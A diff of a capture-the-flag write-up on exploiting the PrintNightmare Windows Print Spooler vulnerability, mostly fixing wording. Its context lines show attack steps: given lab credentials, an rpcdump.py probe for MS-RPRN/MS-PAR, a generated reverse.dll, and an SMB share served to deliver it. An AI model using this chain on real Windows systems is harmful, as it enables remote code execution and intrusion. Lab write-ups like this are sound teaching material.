@@ -2,14 +2,14 @@
 
 ![](Pasted%20image%2020210809231954.png)
 
-If you don't live under a rock and follow cyber security news even slightly, you'd be aware that a new RCE vulnerability for Windows Printer Spool service was released recently. The vulnerability dubbed PrintNightmare has released a lot of attention and for the right reasons... Its pretty epic!
+If you don't live under a rock and follow cyber security news even slightly, you'd be aware that a new RCE vulnerability for Windows Printer Spooler service was released recently. The vulnerability dubbed PrintNightmare has gathered a lot of attention and for the right reasons... Its pretty epic!
 
 The name of the challenge hints at it being about this vulnerability and the note gives it away (especially if you solved the previous challenge using PrintNightmare ;) ):
 > Note 2: this vulnerability was also present in the Scorching challenge (which has been patched as of phase 3).
 
 We're given credentials to begin with `Space:Inv4d3r` which means most of the work is already done for us. Now we only need to run the exploit.
 
-We can check if MS-PAR and MS-RPRN system calls are exposed. Either of these may be used to exploit this vulnerability:
+We can check if MS-PAR and MS-RPRN system calls are exposed using `rpcdump.py` (yet another tool from impacket). Either of these may be used to exploit this vulnerability:
 ```
 % rpcdump.py "Space:Inv4d3r@10.6.0.2" | egrep 'MS-RPRN|MS-PAR'
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
@@ -60,7 +60,7 @@ Saved as: reverse.dll
 (asdf-I4AHjtDI) (main)⚡ % mv reverse.dll myshare   
 ```
 
-At this point, we can start the smbserver in a separate terminal window and server the "myshare" folder as a share named "myshare":
+At this point, we can start the smbserver in a separate terminal window and serve the "myshare" folder as a share named "myshare":
 ```
 % sudo smbserver.py myshare myshare
 [sudo] password for lo:
